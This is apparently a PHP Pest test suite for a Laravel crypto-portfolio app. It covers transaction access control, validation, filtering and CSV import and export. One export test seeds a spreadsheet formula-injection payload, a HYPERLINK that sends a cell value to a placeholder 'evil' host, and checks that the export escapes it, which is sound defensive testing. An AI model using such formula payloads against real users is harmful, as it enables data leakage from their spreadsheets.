<?php

use App\Models\Asset;
use App\Models\AssetPrice;
use App\Models\Exchange;
use App\Models\Portfolio;
use App\Models\Transaction;
use App\Models\User;
use Illuminate\Http\UploadedFile;

test('ゲストは取引一覧にアクセスできない', function () {
    $this->get(route('transactions.index'))
        ->assertRedirect(route('login'));
});

test('自分の取引のみ一覧に表示される', function () {
    $me = User::factory()->create();
    $other = User::factory()->create();

    $myPortfolio = Portfolio::factory()->for($me)->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();

    Transaction::factory()->for($myPortfolio)->for($asset)->count(2)->create();
    Transaction::factory()->for($otherPortfolio)->for($asset)->count(3)->create();

    $this->actingAs($me)
        ->get(route('transactions.index'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('Transactions/Index')
            ->has('transactions.data', 2)
        );
});

test('取引作成画面は複数の価格履歴があっても PostgreSQL で曖昧列エラーにならない', function () {
    $user = User::factory()->create();
    Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    AssetPrice::factory()->for($asset)->create([
        'recorded_at' => now()->subDays(2),
        'price_jpy' => 1_000_000,
    ]);
    AssetPrice::factory()->for($asset)->create([
        'recorded_at' => now()->subDay(),
        'price_jpy' => 2_000_000,
    ]);

    $this->actingAs($user)
        ->get(route('transactions.create'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('Transactions/Create')
            ->has('assets')
        );

    $asset->load('latestPrice');
    expect((float) $asset->latestPrice->price_jpy)->toBe(2_000_000.0);
});

test('取引を作成できる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    $exchange = Exchange::factory()->create();

    $payload = [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'exchange_id' => $exchange->id,
        'type' => Transaction::TYPE_BUY,
        'amount' => 1.5,
        'price_jpy' => 1_000_000,
        'fee_jpy' => 100,
        'executed_at' => now()->subHour()->toDateTimeString(),
        'note' => '初回購入',
    ];

    $this->actingAs($user)
        ->post(route('transactions.store'), $payload)
        ->assertRedirect()
        ->assertSessionHas('success');

    $this->assertDatabaseHas('transactions', [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'type' => 'buy',
        'amount' => 1.5,
    ]);
});

test('他ユーザーのポートフォリオを指定して取引を作成できない', function () {
    $me = User::factory()->create();
    $other = User::factory()->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();

    $this->actingAs($me)
        ->from(route('transactions.create'))
        ->post(route('transactions.store'), [
            'portfolio_id' => $otherPortfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 1,
            'price_jpy' => 1000,
            'executed_at' => now()->toDateTimeString(),
        ])
        ->assertRedirect(route('transactions.create'))
        ->assertSessionHasErrors('portfolio_id');

    $this->assertDatabaseCount('transactions', 0);
});

test('数量や日時のバリデーションが効く', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();

    $this->actingAs($user)
        ->from(route('transactions.create'))
        ->post(route('transactions.store'), [
            'portfolio_id' => $portfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 0,
            'price_jpy' => -1,
            'executed_at' => now()->addDay()->toDateTimeString(),
        ])
        ->assertRedirect(route('transactions.create'))
        ->assertSessionHasErrors(['amount', 'price_jpy', 'executed_at']);
});

test('他ユーザーの取引は編集・更新・削除できない', function () {
    $me = User::factory()->create();
    $myPortfolio = Portfolio::factory()->for($me)->create();
    $other = User::factory()->create();
    $otherPortfolio = Portfolio::factory()->for($other)->create();
    $asset = Asset::factory()->create();
    $tx = Transaction::factory()->for($otherPortfolio)->for($asset)->create();

    $this->actingAs($me)
        ->get(route('transactions.edit', $tx))
        ->assertForbidden();

    $this->actingAs($me)
        ->put(route('transactions.update', $tx), [
            'portfolio_id' => $myPortfolio->id,
            'asset_id' => $asset->id,
            'type' => Transaction::TYPE_BUY,
            'amount' => 99,
            'price_jpy' => 1,
            'executed_at' => now()->toDateTimeString(),
        ])
        ->assertForbidden();

    $this->actingAs($me)
        ->delete(route('transactions.destroy', $tx))
        ->assertForbidden();
});

test('自分の取引を削除できる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $asset = Asset::factory()->create();
    $tx = Transaction::factory()->for($portfolio)->for($asset)->create();

    $this->actingAs($user)
        ->delete(route('transactions.destroy', $tx))
        ->assertRedirect();

    $this->assertDatabaseMissing('transactions', ['id' => $tx->id]);
});

test('取引CSVエクスポートで数式インジェクションがエスケープされる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create(['name' => '=evil_portfolio']);
    $asset = Asset::factory()->create(['symbol' => 'BTC', 'name' => 'Bitcoin']);
    Transaction::factory()
        ->for($portfolio)
        ->for($asset)
        ->buy()
        ->create([
            'note' => '=HYPERLINK("http://evil/?x="&A1,"click")',
            'price_jpy' => 1000,
            'fee_jpy' => 0,
            'amount' => 1,
        ]);

    $response = $this->actingAs($user)->get(route('transactions.export'));
    $response->assertOk();

    $csv = $response->streamedContent();

    // 先頭に ' が付いていること（Excelが数式として評価しない）
    expect($csv)->toContain("'=HYPERLINK(");
    expect($csv)->toContain("'=evil_portfolio");

    // = で始まる形のまま（サニタイズ前）の値がそのままは出ていないこと
    expect($csv)->not->toMatch('/(^|,|")=HYPERLINK/m');
});

test('種別と銘柄でフィルタできる', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create();
    $btc = Asset::factory()->create(['symbol' => 'BTC']);
    $eth = Asset::factory()->create(['symbol' => 'ETH']);

    Transaction::factory()->for($portfolio)->for($btc)->buy()->create();
    Transaction::factory()->for($portfolio)->for($btc)->sell()->create();
    Transaction::factory()->for($portfolio)->for($eth)->buy()->create();

    $this->actingAs($user)
        ->get(route('transactions.index', ['asset_id' => $btc->id, 'type' => 'buy']))
        ->assertOk()
        ->assertInertia(fn ($page) => $page->has('transactions.data', 1));
});

test('CSVインポート画面を表示できる', function () {
    $user = User::factory()->create();
    Portfolio::factory()->for($user)->create();

    $this->actingAs($user)
        ->get(route('transactions.import.create'))
        ->assertOk()
        ->assertInertia(fn ($page) => $page
            ->component('Transactions/Import')
            ->has('portfolios', 1)
            ->has('csvTemplates', 7)
        );
});

test('ゲストはCSVインポートテンプレートをダウンロードできない', function () {
    $this->get(route('transactions.import.template', 'standard'))
        ->assertRedirect(route('login'));
});

test('CSVインポートテンプレートをダウンロードできる', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)
        ->get(route('transactions.import.template', 'binance-japan'));

    $response->assertOk();
    $response->assertHeader('Content-Type', 'text/csv; charset=UTF-8');
    $response->assertHeader(
        'Content-Disposition',
        'attachment; filename="transaction_import_template_binance-japan.csv"',
    );

    $csv = $response->streamedContent();

    expect($csv)->toStartWith("\xEF\xBB\xBF")
        ->and($csv)->toContain('取引日時,種別コード,銘柄シンボル,銘柄名,数量,単価(JPY),手数料(JPY),取引所,ポートフォリオ,メモ,external_id')
        ->and($csv)->toContain('"2026-06-01 10:00:00",buy,BTC,Bitcoin,0.01,10000000,0,"Binance Japan",')
        ->and($csv)->toContain('binance-japan-20260601-001');
});

test('存在しないCSVインポートテンプレートは404になる', function () {
    $user = User::factory()->create();

    $this->actingAs($user)
        ->get(route('transactions.import.template', 'unknown'))
        ->assertNotFound();
});

test('CSVから取引を取り込める', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create(['name' => 'Main']);
    $exchange = Exchange::factory()->create(['name' => 'Binance Japan', 'code' => 'binance']);

    $csv = implode("\n", [
        '取引日時,種別コード,銘柄シンボル,銘柄名,数量,単価(JPY),手数料(JPY),取引所,ポートフォリオ,メモ,external_id',
        '2026-06-01 10:20:00,buy,BTC,Bitcoin,0.01,"10,000,000",100,Binance Japan,Main,過去分,binance-1',
    ]);

    $this->actingAs($user)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'csv_file' => UploadedFile::fake()->createWithContent('transactions.csv', $csv),
        ])
        ->assertRedirect(route('transactions.import.create'))
        ->assertSessionHas('import_preview');

    $preview = session('import_preview');
    expect($preview['importable'])->toBe(1)
        ->and($preview['skipped'])->toBe(0)
        ->and($preview['create_assets'])->toBe(1);

    $this->assertDatabaseMissing('assets', ['symbol' => 'BTC']);
    $this->assertDatabaseCount('transactions', 0);

    $this->actingAs($user)
        ->post(route('transactions.import.store'), [
            'action' => 'import',
            'import_token' => $preview['token'],
            'portfolio_id' => $preview['portfolio_id'],
        ])
        ->assertRedirect(route('transactions.index'))
        ->assertSessionHas('success');

    $asset = Asset::where('symbol', 'BTC')->first();

    $this->assertDatabaseHas('transactions', [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'exchange_id' => $exchange->id,
        'type' => Transaction::TYPE_BUY,
        'external_source' => 'csv:manual',
        'external_id' => 'binance-1',
        'note' => '過去分',
    ]);
});

test('Binance Japanの現物取引CSVを取り込める', function () {
    $user = User::factory()->create();
    $portfolio = Portfolio::factory()->for($user)->create(['name' => 'Main']);
    $exchange = Exchange::factory()->create(['name' => 'Binance Japan', 'code' => 'binance']);

    $csv = implode("\n", [
        'Date(UTC),Pair,Side,Price,Executed,Amount,Fee,Role',
        '2026-06-01 10:20:00,BTCJPY,BUY,10000000 JPY,0.01 BTC,100000 JPY,0.00001 BTC,TAKER',
    ]);

    $this->actingAs($user)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'portfolio_id' => $portfolio->id,
            'csv_file' => UploadedFile::fake()->createWithContent('binance-trades.csv', $csv),
        ])
        ->assertRedirect(route('transactions.import.create'))
        ->assertSessionHas('import_preview');

    $preview = session('import_preview');
    expect($preview['importable'])->toBe(1)
        ->and($preview['rows'][0]['symbol'])->toBe('BTC')
        ->and($preview['rows'][0]['amount'])->toBe(0.01)
        ->and($preview['rows'][0]['price_jpy'])->toBe(10000000.0)
        ->and($preview['rows'][0]['exchange'])->toBe('Binance Japan');

    $this->actingAs($user)
        ->post(route('transactions.import.store'), [
            'action' => 'import',
            'import_token' => $preview['token'],
            'portfolio_id' => $preview['portfolio_id'],
        ])
        ->assertRedirect(route('transactions.index'))
        ->assertSessionHas('success');

    $asset = Asset::where('symbol', 'BTC')->first();

    $this->assertDatabaseHas('transactions', [
        'portfolio_id' => $portfolio->id,
        'asset_id' => $asset->id,
        'exchange_id' => $exchange->id,
        'type' => Transaction::TYPE_BUY,
        'amount' => 0.01,
        'price_jpy' => 10000000,
        'fee_jpy' => 0,
        'note' => '手数料: 0.00001 BTC',
    ]);
});

test('CSVインポートは重複external_idをスキップする', function () {
    $user = User::factory()->create();
    Portfolio::factory()->for($user)->create(['name' => 'Main']);

    $csv = implode("\n", [
        'executed_at,type,symbol,amount,price_jpy,portfolio,external_id',
        '2026-06-01 10:20:00,buy,ETH,1,500000,Main,row-1',
    ]);

    $file = fn () => UploadedFile::fake()->createWithContent('transactions.csv', $csv);

    $this->actingAs($user)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'csv_file' => $file(),
        ])
        ->assertRedirect(route('transactions.import.create'));

    $preview = session('import_preview');

    $this->actingAs($user)
        ->post(route('transactions.import.store'), [
            'action' => 'import',
            'import_token' => $preview['token'],
            'portfolio_id' => $preview['portfolio_id'],
        ])
        ->assertRedirect(route('transactions.index'));

    $this->actingAs($user)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'csv_file' => $file(),
        ])
        ->assertRedirect(route('transactions.import.create'))
        ->assertSessionHas('import_preview');

    $preview = session('import_preview');
    expect($preview['importable'])->toBe(0)
        ->and($preview['skipped'])->toBe(1);

    $this->actingAs($user)
        ->post(route('transactions.import.store'), [
            'action' => 'import',
            'import_token' => $preview['token'],
            'portfolio_id' => $preview['portfolio_id'],
        ])
        ->assertRedirect(route('transactions.index'))
        ->assertSessionHas('success', 'CSVを取り込みました。登録 0 件、重複スキップ 1 件。');

    expect(Transaction::count())->toBe(1);
});

test('CSVインポートで他ユーザーのポートフォリオは使えない', function () {
    $me = User::factory()->create();
    $other = User::factory()->create();
    Portfolio::factory()->for($other)->create(['name' => 'Other']);

    $csv = implode("\n", [
        'executed_at,type,symbol,amount,price_jpy,portfolio',
        '2026-06-01 10:20:00,buy,BTC,1,1000000,Other',
    ]);

    $this->actingAs($me)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'csv_file' => UploadedFile::fake()->createWithContent('transactions.csv', $csv),
        ])
        ->assertRedirect(route('transactions.import.create'))
        ->assertSessionHas('import_errors');

    $this->assertDatabaseCount('transactions', 0);
});

test('CSVインポートで途中行にエラーがある場合は銘柄作成もロールバックされる', function () {
    $user = User::factory()->create();
    Portfolio::factory()->for($user)->create(['name' => 'Main']);

    $csv = implode("\n", [
        'executed_at,type,symbol,amount,price_jpy,portfolio,external_id',
        '2026-06-01 10:20:00,buy,NEWCOIN,1,500000,Main,row-1',
        '2026-06-01 10:20:00,buy,BADCOIN,0,500000,Main,row-2',
    ]);

    $this->actingAs($user)
        ->from(route('transactions.import.create'))
        ->post(route('transactions.import.store'), [
            'action' => 'preview',
            'csv_file' => UploadedFile::fake()->createWithContent('transactions.csv', $csv),
        ])
        ->assertRedirect(route('transactions.import.create'))
        ->assertSessionHas('import_errors');

    $this->assertDatabaseCount('transactions', 0);
    $this->assertDatabaseMissing('assets', ['symbol' => 'NEWCOIN']);
});
